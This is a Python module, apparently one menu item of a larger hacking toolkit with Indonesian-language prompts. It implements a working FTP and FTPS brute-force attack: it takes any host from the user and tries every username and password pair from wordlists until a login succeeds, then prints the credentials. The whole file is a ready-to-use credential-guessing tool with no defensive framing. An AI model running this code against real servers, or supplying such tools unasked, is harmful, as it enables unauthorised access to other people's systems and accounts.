"""Menu 11 — FTP Bruteforce (FTP, FTPS)"""
import os
import ftplib
from colorama import Fore, Style

USERLIST = os.path.join("wordlists", "ftp_user.txt")
PASSLIST = os.path.join("wordlists", "ftp_pass.txt")


def try_ftp(host, user, password, port=21, tls=False):
    try:
        if tls:
            ftp = ftplib.FTP_TLS()
        else:
            ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(user, password)
        ftp.quit()
        return True
    except Exception:
        return False


def run():
    print(f"{Fore.CYAN}[*] FTP Bruteforce{Style.RESET_ALL}")
    host = input("Host (IP / domain): ").strip()
    port = int(input("Port [21]: ").strip() or 21)
    use_tls = input("Pakai FTPS? [y/N]: ").strip().lower() == "y"
    user = input("Username (kosongkan untuk pakai wordlist): ").strip()
    password = input("Password (kosongkan untuk pakai wordlist): ").strip()

    if user and password:
        ok = try_ftp(host, user, password, port, use_tls)
        print(f"{Fore.GREEN}[+] BERHASIL: {user}:{password}{Style.RESET_ALL}" if ok
              else f"{Fore.RED}[-] GAGAL{Style.RESET_ALL}")
        return

    if not os.path.exists(USERLIST) or not os.path.exists(PASSLIST):
        print(f"{Fore.RED}[!] Wordlist tidak ada: {USERLIST} / {PASSLIST}{Style.RESET_ALL}")
        return

    with open(USERLIST) as f:
        users = [l.strip() for l in f if l.strip()]
    with open(PASSLIST) as f:
        passwords = [l.strip() for l in f if l.strip()]

    print(f"{Fore.YELLOW}[*] Users: {len(users)} | Passwords: {len(passwords)}{Style.RESET_ALL}")
    for u in users:
        for p in passwords:
            if try_ftp(host, u, p, port, use_tls):
                print(f"{Fore.GREEN}[+] BERHASIL: {u}:{p}{Style.RESET_ALL}")
                return
            print(f"{Fore.YELLOW}[-] {u}:{p}{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Tidak ada kombinasi yang berhasil.{Style.RESET_ALL}")
